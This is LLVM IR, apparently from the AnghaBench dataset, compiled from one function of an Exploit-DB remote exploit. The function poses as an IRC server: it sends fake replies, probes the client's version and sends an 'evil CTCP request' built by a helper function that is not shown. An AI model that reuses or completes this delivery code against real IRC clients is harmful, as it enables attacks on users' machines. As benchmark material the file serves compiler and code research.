; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23366.c_send_mes.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23366.c_send_mes.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@HOSTNAME = common dso_local global i8* null, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"[-] %s\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@IDENT = common dso_local global i8* null, align 8
@HOST_FOUND = common dso_local global i8* null, align 8
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [25 x i8] c"[%s] Fake replies sent.\0A\00", align 1
@PING = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [17 x i8] c"[%s] Ping sent.\0A\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@check_version = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [35 x i8] c"[%s] Looking up client version...\0A\00", align 1
@.str.5 = private unnamed_addr constant [30 x i8] c":x!x PRIVMSG %s: %cVERSION%c\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"VERSION \00", align 1
@.str.7 = private unnamed_addr constant [24 x i8] c"[%s] Client version: %s\00", align 1
@.str.8 = private unnamed_addr constant [28 x i8] c"[%s] Welcome message sent.\0A\00", align 1
@.str.9 = private unnamed_addr constant [30 x i8] c"[%s] Evil CTCP request sent.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @send_mes(i32 %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [1024 x i8], align 16
  %7 = alloca [1024 x i8], align 16
  %8 = alloca [512 x i8], align 16
  %9 = alloca [512 x i8], align 16
  %10 = alloca i8*, align 8
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %11 = load i32, i32* %3, align 4
  %12 = load i8*, i8** @HOSTNAME, align 8
  %13 = load i8*, i8** @HOSTNAME, align 8
  %14 = call i32 @strlen(i8* %13)
  %15 = call i32 (i32, i8*, i32, ...) @send(i32 %11, i8* %12, i32 %14, i32 0)
  store i32 %15, i32* %5, align 4
  %16 = load i32, i32* %5, align 4
  %17 = icmp slt i32 %16, 0
  br i1 %17, label %18, label %24

18:                                               ; preds = %2
  %19 = load i32, i32* @stderr, align 4
  %20 = load i32, i32* @errno, align 4
  %21 = call i8* @strerror(i32 %20)
  %22 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %19, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 0) #3
  unreachable

24:                                               ; preds = %2
  %25 = call i32 @sleep(i32 1)
  %26 = load i32, i32* %3, align 4
  %27 = load i8*, i8** @IDENT, align 8
  %28 = load i8*, i8** @IDENT, align 8
  %29 = call i32 @strlen(i8* %28)
  %30 = call i32 (i32, i8*, i32, ...) @send(i32 %26, i8* %27, i32 %29, i32 0)
  store i32 %30, i32* %5, align 4
  %31 = load i32, i32* %5, align 4
  %32 = icmp slt i32 %31, 0
  br i1 %32, label %33, label %39

33:                                               ; preds = %24
  %34 = load i32, i32* @stderr, align 4
  %35 = load i32, i32* @errno, align 4
  %36 = call i8* @strerror(i32 %35)
  %37 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %34, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* %36)
  %38 = call i32 @exit(i32 0) #3
  unreachable

39:                                               ; preds = %24
  %40 = call i32 @sleep(i32 1)
  %41 = load i32, i32* %3, align 4
  %42 = load i8*, i8** @HOST_FOUND, align 8
  %43 = load i8*, i8** @HOST_FOUND, align 8
  %44 = call i32 @strlen(i8* %43)
  %45 = call i32 (i32, i8*, i32, ...) @send(i32 %41, i8* %42, i32 %44, i32 0)
  store i32 %45, i32* %5, align 4
  %46 = load i32, i32* %5, align 4
  %47 = icmp slt i32 %46, 0
  br i1 %47, label %48, label %54

48:                                               ; preds = %39
  %49 = load i32, i32* @stderr, align 4
  %50 = load i32, i32* @errno, align 4
  %51 = call i8* @strerror(i32 %50)
  %52 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %49, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* %51)
  %53 = call i32 @exit(i32 0) #3
  unreachable

54:                                               ; preds = %39
  %55 = call i32 @sleep(i32 1)
  %56 = load i32, i32* @stdout, align 4
  %57 = load i8*, i8** %4, align 8
  %58 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %56, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0), i8* %57)
  %59 = load i32, i32* %3, align 4
  %60 = load i8*, i8** @PING, align 8
  %61 = load i8*, i8** @PING, align 8
  %62 = call i32 @strlen(i8* %61)
  %63 = call i32 (i32, i8*, i32, ...) @send(i32 %59, i8* %60, i32 %62, i32 0)
  store i32 %63, i32* %5, align 4
  %64 = load i32, i32* %5, align 4
  %65 = icmp slt i32 %64, 0
  br i1 %65, label %66, label %72

66:                                               ; preds = %54
  %67 = load i32, i32* @stderr, align 4
  %68 = load i32, i32* @errno, align 4
  %69 = call i8* @strerror(i32 %68)
  %70 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %67, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* %69)
  %71 = call i32 @exit(i32 0) #3
  unreachable

72:                                               ; preds = %54
  %73 = load i32, i32* @stdout, align 4
  %74 = load i8*, i8** %4, align 8
  %75 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %73, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0), i8* %74)
  %76 = load i32, i32* %3, align 4
  %77 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %78 = call i32 @read(i32 %76, i8* %77, i32 1024)
  store i32 %78, i32* %5, align 4
  %79 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %80 = call i8* @strstr(i8* %79, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  %81 = icmp ne i8* %80, null
  br i1 %81, label %82, label %162

82:                                               ; preds = %72
  %83 = load i64, i64* @check_version, align 8
  %84 = icmp ne i64 %83, 0
  br i1 %84, label %85, label %134

85:                                               ; preds = %82
  %86 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %87 = call i32 @memset(i8* %86, i32 0, i32 512)
  %88 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %89 = call i32 @memset(i8* %88, i32 0, i32 512)
  %90 = load i32, i32* @stdout, align 4
  %91 = load i8*, i8** %4, align 8
  %92 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %90, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.4, i64 0, i64 0), i8* %91)
  %93 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %94 = load i8*, i8** %4, align 8
  %95 = call i32 @sprintf(i8* %93, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.5, i64 0, i64 0), i8* %94, i32 1, i32 1)
  %96 = load i32, i32* %3, align 4
  %97 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %98 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %99 = call i32 @strlen(i8* %98)
  %100 = call i32 (i32, i8*, i32, ...) @send(i32 %96, i8* %97, i32 %99, i32 0)
  store i32 %100, i32* %5, align 4
  %101 = load i32, i32* %5, align 4
  %102 = icmp slt i32 %101, 0
  br i1 %102, label %103, label %109

103:                                              ; preds = %85
  %104 = load i32, i32* @stderr, align 4
  %105 = load i32, i32* @errno, align 4
  %106 = call i8* @strerror(i32 %105)
  %107 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %104, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* %106)
  %108 = call i32 @exit(i32 0) #3
  unreachable

109:                                              ; preds = %85
  %110 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %111 = call i32 @memset(i8* %110, i32 0, i32 1024)
  br label %112

112:                                              ; preds = %109, %132
  %113 = load i32, i32* %3, align 4
  %114 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %115 = call i32 @read(i32 %113, i8* %114, i32 1024)
  store i32 %115, i32* %5, align 4
  %116 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %117 = call i8* @strstr(i8* %116, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  store i8* %117, i8** %10, align 8
  %118 = icmp ne i8* %117, null
  br i1 %118, label %119, label %132

119:                                              ; preds = %112
  %120 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %121 = call i32 @memset(i8* %120, i32 0, i32 512)
  %122 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %123 = load i8*, i8** %10, align 8
  %124 = getelementptr inbounds i8, i8* %123, i64 8
  %125 = call i32 @strncpy(i8* %122, i8* %124, i32 511)
  %126 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 511
  store i8 0, i8* %126, align 1
  %127 = load i32, i32* @stdout, align 4
  %128 = load i8*, i8** %4, align 8
  %129 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %130 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %127, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.7, i64 0, i64 0), i8* %128, i8* %129)
  %131 = call i32 @sleep(i32 3)
  br label %133

132:                                              ; preds = %112
  br label %112

133:                                              ; preds = %119
  br label %134

134:                                              ; preds = %133, %82
  %135 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %136 = load i8*, i8** %4, align 8
  %137 = getelementptr inbounds [512 x i8], [512 x i8]* %9, i64 0, i64 0
  %138 = call i8* @build_welcome_mes(i8* %136, i8* %137)
  %139 = call i32 @strncpy(i8* %135, i8* %138, i32 1023)
  %140 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 1023
  store i8 0, i8* %140, align 1
  %141 = load i32, i32* %3, align 4
  %142 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %143 = call i32 (i32, i8*, i32, ...) @send(i32 %141, i8* %142, i32 1024)
  store i32 %143, i32* %5, align 4
  %144 = load i32, i32* @stdout, align 4
  %145 = load i8*, i8** %4, align 8
  %146 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %144, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.8, i64 0, i64 0), i8* %145)
  %147 = call i32 @sleep(i32 1)
  %148 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %149 = call i32 @memset(i8* %148, i32 0, i32 1024)
  %150 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %151 = load i8*, i8** %4, align 8
  %152 = call i8* @build(i8* %151)
  %153 = call i32 @strncpy(i8* %150, i8* %152, i32 1023)
  %154 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 1023
  store i8 0, i8* %154, align 1
  %155 = load i32, i32* %3, align 4
  %156 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %157 = call i32 (i32, i8*, i32, ...) @send(i32 %155, i8* %156, i32 1024)
  store i32 %157, i32* %5, align 4
  %158 = call i32 @sleep(i32 1)
  %159 = load i32, i32* @stdout, align 4
  %160 = load i8*, i8** %4, align 8
  %161 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %159, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.9, i64 0, i64 0), i8* %160)
  br label %162

162:                                              ; preds = %134, %72
  ret void
}

declare dso_local i32 @send(i32, i8*, i32, ...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, i8*, ...) #1

declare dso_local i8* @strerror(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i8* @strstr(i8*, i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i32, i32) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i8* @build_welcome_mes(i8*, i8*) #1

declare dso_local i8* @build(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
